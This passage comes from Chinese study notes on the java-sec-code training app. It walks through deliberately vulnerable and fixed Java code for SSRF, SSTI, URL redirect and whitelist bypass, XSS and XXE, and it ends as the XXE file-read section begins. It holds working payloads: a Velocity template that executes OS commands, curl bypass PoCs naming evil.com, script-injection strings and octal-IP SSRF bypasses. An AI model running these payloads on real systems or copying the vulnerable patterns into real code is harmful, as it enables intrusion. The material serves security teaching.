     * url只允许https或者http，并且设置默认连接超时时间。
     * 该修复方案会主动请求重定向后的链接。
     *
     * @param url        check的url
     * @param checkTimes 设置重定向检测的最大次数，建议设置为10次
     * @return 安全返回true，危险返回false
     */
    public static boolean checkSSRF(String url, int checkTimes) {

        HttpURLConnection connection;
        int connectTime = 5 * 1000;  // 设置连接超时时间5s
        int i = 1;
        String finalUrl = url;
        try {
            do {
                // 判断当前请求的URL是否是内网ip
                if (isInternalIpByUrl(finalUrl)) {
                    logger.error("[-] SSRF check failed. Dangerous url: " + finalUrl);
                    return false;  // 内网ip直接return，非内网ip继续判断是否有重定向
                }

                connection = (HttpURLConnection) new URL(finalUrl).openConnection();
                connection.setInstanceFollowRedirects(false);
                connection.setUseCaches(false); // 设置为false，手动处理跳转，可以拿到每个跳转的URL
                connection.setConnectTimeout(connectTime);
                //connection.setRequestMethod("GET");
                connection.connect(); // send dns request
                int responseCode = connection.getResponseCode(); // 发起网络请求
                if (responseCode >= 300 && responseCode <= 307 && responseCode != 304 && responseCode != 306) {
                    String redirectedUrl = connection.getHeaderField("Location");
                    if (null == redirectedUrl)
                        break;
                    finalUrl = redirectedUrl;
                    i += 1;  // 重定向次数加1
                    logger.info("redirected url: " + finalUrl);
                    if (i == checkTimes) {
                        return false;
                    }
                } else
                    break;
            } while (connection.getResponseCode() != HttpURLConnection.HTTP_OK);
            connection.disconnect();
        } catch (Exception e) {
            return true;  // 如果异常了，认为是安全的，防止是超时导致的异常而验证不成功。
        }
        return true; // 默认返回true
    }


    /**
     * 判断一个URL的IP是否是内网IP
     *
     * @return 如果是内网IP，返回true；非内网IP，返回false。
     */
    public static boolean isInternalIpByUrl(String url) {

        String host = url2host(url);
        if (host.equals("")) {
            return true; // 异常URL当成内网IP等非法URL处理
        }

        String ip = host2ip(host);
        if (ip.equals("")) {
            return true; // 如果域名转换为IP异常，则认为是非法URL
        }

        return isInternalIp(ip);
    }


    /**
     * 使用SubnetUtils库判断ip是否在内网网段
     *
     * @param strIP ip字符串
     * @return 如果是内网ip，返回true，否则返回false。
     */
    public static boolean isInternalIp(String strIP) {
        if (StringUtils.isEmpty(strIP)) {
            logger.error("[-] SSRF check failed. IP is empty. " + strIP);
            return true;
        }

        ArrayList<String> blackSubnets = WebConfig.getSsrfBlockIps();
        for (String subnet : blackSubnets) {
            SubnetUtils utils = new SubnetUtils(subnet);
            if (utils.getInfo().isInRange(strIP)) {
                logger.error("[-] SSRF check failed. Internal IP: " + strIP);
                return true;
            }
        }

        return false;

    }


    /**
     * Convert host to decimal ip.
     * Since there is a bypass in octal using {@link InetAddress#getHostAddress()},
     * the function of converting octal to decimal is added.
     * If it still can be bypassed, please submit
     * <a href="https://github.com/JoyChou93/java-sec-code/pulls">PullRequests</a> or
     * <a href="https://github.com/JoyChou93/java-sec-code/issues">Issues</a>.<br>
     *
     * <p>Normal:</p>
     * <ul>
     *    <li>69299689 to 10.23.78.233</li>
     *    <li>69299689 to 10.23.78.233 </li>
     *    <li>012.0x17.78.233 to 10.23.78.233 </li>
     *    <li>012.027.0116.0351 to 10.23.78.233</li>
     *    <li>127.0.0.1.xip.io to 127.0.0.1</li>
     *    <li>127.0.0.1.nip.io to 127.0.0.1</li>
     * </ul>

     * <p>Bypass: </p>
     * <ul>
     *     <li>01205647351 to 71.220.183.247, actually 10.23.78.233</li>
     *     <li>012.23.78.233 to 12.23.78.233, actually 10.23.78.233</li>
     * </ul>
     * @return decimal ip
     */
    public static String host2ip(String host) {

        if (null == host) {
            return "";
        }

        // convert octal to decimal
         if(isOctalIP(host)) {
             host = decimalIp;
         }

        try {
            InetAddress IpAddress = InetAddress.getByName(host); //  send dns request
            return IpAddress.getHostAddress();
        } catch (Exception e) {
            return "";
        }
    }


    /**
     * Check whether the host is an octal IP, if so, convert it to decimal.
     * @return Octal ip returns true, others return false. 012.23.78.233 return true. 012.0x17.78.233 return false.
     */
    public static boolean isOctalIP(String host) {
        String[] ipParts = host.split("\\.");
        StringBuilder newDecimalIP = new StringBuilder();
        boolean is_octal = false;

        // Octal ip only has number and dot character.
        if (isNumberOrDot(host)) {

            if (ipParts.length != 1 && ipParts.length != 4) {
                return false;
            }

            // 000000001205647351
            if( ipParts.length == 1 && host.startsWith("0") ) {
                decimalIp = Integer.valueOf(host, 8).toString();
                return true;
            }

            // 0000012.23.78.233
            for(String ip : ipParts) {
                if (!isNumber(ip)){
                    throw new SSRFException("Illegal host: " + host + ".");
                }
                if (ip.startsWith("0")) {
                    if (Integer.valueOf(ip, 8) >= 256){
                        throw new SSRFException("Illegal host: " + host + ".\t" + ip + " is above 255.");
                    }
                    newDecimalIP.append(Integer.valueOf(ip, 8)).append(".");
                    is_octal = true;
                }else{
                    if (Integer.valueOf(ip, 10) >= 256) {
                        throw new SSRFException("Illegal host: " + host + ".\t" + ip + " is above 255.");
                    }
                    newDecimalIP.append(ip).append(".");
                }
            }
            decimalIp = newDecimalIP.substring(0, newDecimalIP.lastIndexOf("."));
        }
        return is_octal;
    }

    /**
     * Check string is a number.
     * @return If string is a number 0-9, return true. Otherwise, return false.
     */
    private static boolean isNumber(String str) {
        if (null == str || "".equals(str)) {
            return false;
        }
        for (int i = 0; i < str.length(); i++) {
            char ch = str.charAt(i);
            if (ch < 48 || ch > 57) {
                return false;
            }
        }
        return true;
    }


    /**
     * Check string is a number or dot.
     * @return If string is a number or a dot, return true. Otherwise, return false.
     */
    private static boolean isNumberOrDot(String s) {
        for (int i = 0; i < s.length(); i++) {
            char ch = s.charAt(i);
            if ((ch < 48 || ch > 57) && ch != 46){
                return false;
            }
        }
        return true;
    }

    /**
     * Get host from URL which the protocol must be http:// or https:// and not be //.
     */
    private static String url2host(String url) {
        try {
            // use URI instead of URL
            URI u = new URI(url);
            if (SecurityUtil.isHttp(url)) {
                return u.getHost();
            }
            return "";
        } catch (Exception e) {
            return "";
        }
    }

}
```

### SSTI

重要代码如下：

```java
package org.joychou.controller;
import org.apache.velocity.VelocityContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.apache.velocity.app.Velocity;
import java.io.StringWriter;

@RestController
@RequestMapping("/ssti")
public class SSTI {

    /**
     * SSTI of Java velocity. The latest Velocity version still has this problem.
     * Fix method: Avoid to use Velocity.evaluate method.
     * <p>
     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)
     * Open a calculator in MacOS.
     *
     * @param template exp
     */
    @GetMapping("/velocity")
    public void velocity(String template) {
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
}
```

执行payload： `http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)`

<img src=".\图片\Snipaste_2023-03-18_16-12-09.png" alt="Snipaste_2023-03-18_16-12-09" style="zoom:67%;" />

重点函数：`Velocity.evaluate()`

### URLRedirect

```java
package org.joychou.controller;
import ...............

/**
 * The vulnerability code and security code of Java url redirect.
 * The security code is checking whitelist of url redirect.
 *
 * @author JoyChou (joychou@joychou.org)
 * @version 2017.12.28
 */

@Controller
@RequestMapping("/urlRedirect")
public class URLRedirect {

    /**
     * http://localhost:8080/urlRedirect/redirect?url=http://www.baidu.com
     */
    @GetMapping("/redirect")
    public String redirect(@RequestParam("url") String url) {
        return "redirect:" + url;
    }


    /**
     * http://localhost:8080/urlRedirect/setHeader?url=http://www.baidu.com
     */
    @RequestMapping("/setHeader")
    @ResponseBody
    public static void setHeader(HttpServletRequest request, HttpServletResponse response) {
        String url = request.getParameter("url");
        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect
        response.setHeader("Location", url);
    }


    /**
     * http://localhost:8080/urlRedirect/sendRedirect?url=http://www.baidu.com
     */
    @RequestMapping("/sendRedirect")
    @ResponseBody
    public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String url = request.getParameter("url");
        response.sendRedirect(url); // 302 redirect
    }


    /**
     * Safe code. Because it can only jump according to the path, it cannot jump according to other urls.
     * http://localhost:8080/urlRedirect/forward?url=/urlRedirect/test
     */
    @RequestMapping("/forward")
    @ResponseBody
    public static void forward(HttpServletRequest request, HttpServletResponse response) {
        String url = request.getParameter("url");
        RequestDispatcher rd = request.getRequestDispatcher(url);
        try {
            rd.forward(request, response);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    /**
     * Safe code of sendRedirect.
     * http://localhost:8080/urlRedirect/sendRedirect/sec?url=http://www.baidu.com
     */
    @RequestMapping("/sendRedirect/sec")
    @ResponseBody
    public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response)
            throws IOException {
        String url = request.getParameter("url");
        if (SecurityUtil.checkURL(url) == null) {
            response.setStatus(HttpServletResponse.SC_FORBIDDEN);
            response.getWriter().write("url forbidden");
            return;
        }
        response.sendRedirect(url);
    }
}
```

这里介绍了集中 Java 中 URLRedirect 的方法，有spring中直接 return 、有 `301 redirect` 、有 `302 redirect` 、有 `forword`

要防御的话主要为黑名单，可以参考作者如下函数：

```java
/**
 * 同时支持一级域名和多级域名，相关配置在resources目录下url/url_safe_domain.xml文件。
 * 优先判断黑名单，如果满足黑名单return null。
 *
 * @param url the url need to check
 * @return Safe url returns original url; Illegal url returns null;
 */
public static String checkURL(String url) {

    if (null == url){
        return null;
    }

    ArrayList<String> safeDomains = WebConfig.getSafeDomains();
    ArrayList<String> blockDomains = WebConfig.getBlockDomains();

    try {
        String host = gethost(url);

        // 必须http/https
        if (!isHttp(url)) {
            return null;
        }

        // 如果满足黑名单返回null
        if (blockDomains.contains(host)){
            return null;
        }
        for(String blockDomain: blockDomains) {
            if(host.endsWith("." + blockDomain)) {
                return null;
            }
        }

        // 支持多级域名
        if (safeDomains.contains(host)){
            return url;
        }

        // 支持一级域名
        for(String safedomain: safeDomains) {
            if(host.endsWith("." + safedomain)) {
                return url;
            }
        }
        return null;
    } catch (NullPointerException e) {
        logger.error(e.toString());
        return null;
    }
}
```

### URLWhiteList

白名单下一些url重定向的bypass

```java
package org.joychou.controller;
import ...........

/**
 * The vulnerability code and security code of Java url whitelist.
 * The security code is checking url whitelist.
 *
 * @author JoyChou (joychou@joychou.org)
 * @version 2018.08.23
 */

@RestController
@RequestMapping("/url")
public class URLWhiteList {


    private String domainwhitelist[] = {"joychou.org", "joychou.com"};
    private static final Logger logger = LoggerFactory.getLogger(URLWhiteList.class);

    /**
     * bypass poc: bypassjoychou.org
     * http://localhost:8080/url/vuln/endswith?url=http://aaajoychou.org
     */
    @GetMapping("/vuln/endsWith")
    public String endsWith(@RequestParam("url") String url) {

        String host = SecurityUtil.gethost(url);

        for (String domain : domainwhitelist) {
            if (host.endsWith(domain)) {
                return "Good url.";
            }
        }
        return "Bad url.";
    }


    /**
     * It's the same with <code>indexOf</code>.
     * <p>
     * http://localhost:8080/url/vuln/contains?url=http://joychou.org.bypass.com
     * http://localhost:8080/url/vuln/contains?url=http://bypassjoychou.org
     */
    @GetMapping("/vuln/contains")
    public String contains(@RequestParam("url") String url) {

        String host = SecurityUtil.gethost(url);

        for (String domain : domainwhitelist) {
            if (host.contains(domain)) {
                return "Good url.";
            }
        }
        return "Bad url.";
    }


    /**
     * bypass poc: bypassjoychou.org. It's the same with endsWith.
     * http://localhost:8080/url/vuln/regex?url=http://aaajoychou.org
     */
    @GetMapping("/vuln/regex")
    public String regex(@RequestParam("url") String url) {

        String host = SecurityUtil.gethost(url);
        Pattern p = Pattern.compile("joychou\\.org$");
        Matcher m = p.matcher(host);

        if (m.find()) {
            return "Good url.";
        } else {
            return "Bad url.";
        }
    }


    /**
     * The bypass of using <code>java.net.URL</code> to getHost.
     * <p>
     * Bypass poc1: curl -v 'http://localhost:8080/url/vuln/url_bypass?url=http://evel.com%5c@www.joychou.org/a.html'
     * Bypass poc2: curl -v 'http://localhost:8080/url/vuln/url_bypass?url=http://evil.com%5cwww.joychou.org/a.html'
     * <p>
     * More details: https://github.com/JoyChou93/java-sec-code/wiki/URL-whtielist-Bypass
     */
    @GetMapping("/vuln/url_bypass")
    public String url_bypass(String url) throws MalformedURLException {

        logger.info("url:  " + url);

        if (!SecurityUtil.isHttp(url)) {
            return "Url is not http or https";
        }

        URL u = new URL(url);
        String host = u.getHost();
        logger.info("host:  " + host);

        // endsWith .
        for (String domain : domainwhitelist) {
            if (host.endsWith("." + domain)) {
                return "Good url.";
            }
        }

        return "Bad url.";
    }


    /**
     * First-level & Multi-level host whitelist.
     * http://localhost:8080/url/sec?url=http://aa.joychou.org
     */
    @GetMapping("/sec")
    public String sec(@RequestParam("url") String url) {

        String whiteDomainlists[] = {"joychou.org", "joychou.com", "test.joychou.me"};

        if (!SecurityUtil.isHttp(url)) {
            return "SecurityUtil is not http or https";
        }

        String host = SecurityUtil.gethost(url);

        for (String whiteHost: whiteDomainlists){
            if (whiteHost.startsWith(".") && host.endsWith(whiteHost)) {
                return url;
            } else if (!whiteHost.startsWith(".") && host.equals(whiteHost)) {
                return url;
            }
        }

        return "Bad url.";
    }


    /**
     * http://localhost:8080/url/sec/array_indexOf?url=http://ccc.bbb.joychou.org
     */
    @GetMapping("/sec/array_indexOf")
    public String sec_array_indexOf(@RequestParam("url") String url) {

        // Define muti-level host whitelist.
        ArrayList<String> whiteDomainlists = new ArrayList<>();
        whiteDomainlists.add("bbb.joychou.org");
        whiteDomainlists.add("ccc.bbb.joychou.org");

        if (!SecurityUtil.isHttp(url)) {
            return "SecurityUtil is not http or https";
        }

        String host = SecurityUtil.gethost(url);

        if (whiteDomainlists.indexOf(host) != -1) {
            return "Good url.";
        }
        return "Bad url.";
    }

}
```

### XSS

```JAVA
package org.joychou.controller;
import ................
/**
 * @author JoyChou @2018-01-02
 */
@Controller
@RequestMapping("/xss")
public class XSS {

    /**
     * Vuln Code.
     * ReflectXSS
     * http://localhost:8080/xss/reflect?xss=<script>alert(1)</script>
     *
     * @param xss unescape string
     */
    @RequestMapping("/reflect")
    @ResponseBody
    public static String reflect(String xss) {
        return xss;
    }

    /**
     * Vul Code.
     * StoredXSS Step1
     * http://localhost:8080/xss/stored/store?xss=<script>alert(1)</script>
     *
     * @param xss unescape string
     */
    @RequestMapping("/stored/store")
    @ResponseBody
    public String store(String xss, HttpServletResponse response) {
        Cookie cookie = new Cookie("xss", xss);
        response.addCookie(cookie);
        return "Set param into cookie";
    }

    /**
     * Vul Code.
     * StoredXSS Step2
     * http://localhost:8080/xss/stored/show
     *
     * @param xss unescape string
     */
    @RequestMapping("/stored/show")
    @ResponseBody
    public String show(@CookieValue("xss") String xss) {
        return xss;
    }

    /**
     * safe Code.
     * http://localhost:8080/xss/safe
     */
    @RequestMapping("/safe")
    @ResponseBody
    public static String safe(String xss) {
        return encode(xss);
    }

    private static String encode(String origin) {
        origin = StringUtils.replace(origin, "&", "&amp;");
        origin = StringUtils.replace(origin, "<", "&lt;");
        origin = StringUtils.replace(origin, ">", "&gt;");
        origin = StringUtils.replace(origin, "\"", "&quot;");
        origin = StringUtils.replace(origin, "'", "&#x27;");
        origin = StringUtils.replace(origin, "/", "&#x2F;");
        return origin;
    }
}
```

### XXE

#### 代码

exp：`https://github.com/JoyChou93/java-sec-code/wiki/XXE`

这里我们主要看代码：

```java
package org.joychou.controller;

import org.dom4j.DocumentHelper;
import org.dom4j.io.SAXReader;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.helpers.XMLReaderFactory;
import org.xml.sax.XMLReader;

import java.io.*;

import org.xml.sax.InputSource;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.parsers.SAXParser;

import org.xml.sax.helpers.DefaultHandler;
import org.apache.commons.digester3.Digester;
import org.jdom2.input.SAXBuilder;
import org.joychou.util.WebUtils;

/**
 * Java xxe vuln and security code.
 *
 * @author JoyChou @2017-12-22
 */

@RestController
@RequestMapping("/xxe")
public class XXE {

    private static Logger logger = LoggerFactory.getLogger(XXE.class);
    private static String EXCEPT = "xxe except";

    @PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return "xmlReader xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    @RequestMapping(value = "/xmlReader/sec", method = RequestMethod.POST)
    public String xmlReaderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // fix code start
            xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
            xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            //fix code end
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "xmlReader xxe security code";
    }


    @RequestMapping(value = "/SAXBuilder/vuln", method = RequestMethod.POST)
    public String SAXBuilderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));  // cause xxe
            return "SAXBuilder xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }

    @RequestMapping(value = "/SAXBuilder/sec", method = RequestMethod.POST)
    public String SAXBuilderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            builder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            builder.setFeature("http://xml.org/sax/features/external-general-entities", false);
            builder.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "SAXBuilder xxe security code";
    }

    @RequestMapping(value = "/SAXReader/vuln", method = RequestMethod.POST)
    public String SAXReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXReader reader = new SAXReader();
            // org.dom4j.Document document
            reader.read(new InputSource(new StringReader(body))); // cause xxe

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "SAXReader xxe vuln code";
    }

    @RequestMapping(value = "/SAXReader/sec", method = RequestMethod.POST)
    public String SAXReaderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXReader reader = new SAXReader();
            reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
            reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            // org.dom4j.Document document
            reader.read(new InputSource(new StringReader(body)));
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "SAXReader xxe security code";
    }

    @RequestMapping(value = "/SAXParser/vuln", method = RequestMethod.POST)
    public String SAXParserVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

            return "SAXParser xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    @RequestMapping(value = "/SAXParser/sec", method = RequestMethod.POST)
    public String SAXParserSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
            spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "SAXParser xxe security code";
    }


    @RequestMapping(value = "/Digester/vuln", method = RequestMethod.POST)
    public String DigesterVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));  // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "Digester xxe vuln code";
    }

    @RequestMapping(value = "/Digester/sec", method = RequestMethod.POST)
    public String DigesterSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            digester.setFeature("http://xml.org/sax/features/external-general-entities", false);
            digester.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            digester.parse(new StringReader(body));  // parse xml

            return "Digester xxe security code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    // 有回显
    @RequestMapping(value = "/DocumentBuilder/vuln01", method = RequestMethod.POST)
    public String DocumentBuilderVuln01(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i < rootNodeList.getLength(); i++) {
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j < child.getLength(); j++) {
                    Node node = child.item(j);
                    buf.append(String.format("%s: %s\n", node.getNodeName(), node.getTextContent()));
                }
            }
            sr.close();
            return buf.toString();
        } catch (Exception e) {
            e.printStackTrace();
            logger.error(e.toString());
            return e.toString();
        }
    }


    // 有回显
    @RequestMapping(value = "/DocumentBuilder/vuln02", method = RequestMethod.POST)
    public String DocumentBuilderVuln02(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder result = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i < rootNodeList.getLength(); i++) {
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j < child.getLength(); j++) {
                    Node node = child.item(j);
                    // 正常解析XML，需要判断是否是ELEMENT_NODE类型。否则会出现多余的的节点。
                    if (child.item(j).getNodeType() == Node.ELEMENT_NODE) {
                        result.append(String.format("%s: %s\n", node.getNodeName(), node.getFirstChild()));
                    }
                }
            }
            sr.close();
            return result.toString();
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    @RequestMapping(value = "/DocumentBuilder/Sec", method = RequestMethod.POST)
    public String DocumentBuilderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
            dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            db.parse(is);  // parse xml
            sr.close();
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "DocumentBuilder xxe security code";
    }


    @RequestMapping(value = "/DocumentBuilder/xinclude/vuln", method = RequestMethod.POST)
    public String DocumentBuilderXincludeVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setXIncludeAware(true);   // 支持XInclude
            dbf.setNamespaceAware(true);  // 支持XInclude
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
            return "DocumentBuilder xinclude xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }


    @RequestMapping(value = "/DocumentBuilder/xinclude/sec", method = RequestMethod.POST)
    public String DocumentBuilderXincludeSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

            dbf.setXIncludeAware(true);   // 支持XInclude
            dbf.setNamespaceAware(true);  // 支持XInclude
            dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
            dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "DocumentBuilder xinclude xxe vuln code";
    }


    @PostMapping("/XMLReader/vuln")
    public String XMLReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "XMLReader xxe vuln code";
    }


    @PostMapping("/XMLReader/sec")
    public String XMLReaderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
            xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            xmlReader.parse(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "XMLReader xxe security code";
    }


    /**
     * 修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；
     * 不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。
     */
    @PostMapping("/DocumentHelper/vuln")
    public String DocumentHelper(HttpServletRequest req) {
        try {
            String body = WebUtils.getRequestBody(req);
            DocumentHelper.parseText(body); // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "DocumentHelper xxe vuln code";
    }


    private static void response(NodeList rootNodeList){
        for (int i = 0; i < rootNodeList.getLength(); i++) {
            Node rootNode = rootNodeList.item(i);
            NodeList xxe = rootNode.getChildNodes();
            for (int j = 0; j < xxe.getLength(); j++) {
                Node xxeNode = xxe.item(j);
                // 测试不能blind xxe，所以强行加了一个回显
                logger.info("xxeNode: " + xxeNode.getNodeValue());
            }

        }
    }

    public static void main(String[] args)  {
    }

}
```

白盒中可以搜索关键带 `XML` 的敏感字符的函数

-**XXE黑盒发现**：

1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试

2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe

3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行

-**XXE白盒发现**：

1、可通过应用功能追踪代码定位审计

2、可通过脚本特定函数搜索定位审计

3、可通过伪协议玩法绕过相关修复等

#### 利用姿势

##### 4.1 有回显

正常解析XML：

```
POST /xxe/DocumentBuilder HTTP/1.1
Host: 127.0.0.1:8080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,de;q=0.7,fr;q=0.6,da;q=0.5,mt;q=0.4
Connection: close
Content-Type: application/xml
Content-Length: 170

<?xml version="1.0" encoding="UTF-8"?>
<book id="1">		
	<name>Good Job</name>		
	<author>JoyChou</author>		
	<year>2017</year>		
	<price>100.00</price>	
</book>
```

返回

```
name: Good Job
author: JoyChou
year: 2017
price: 100.00
```

利用file协议读取文件：

```
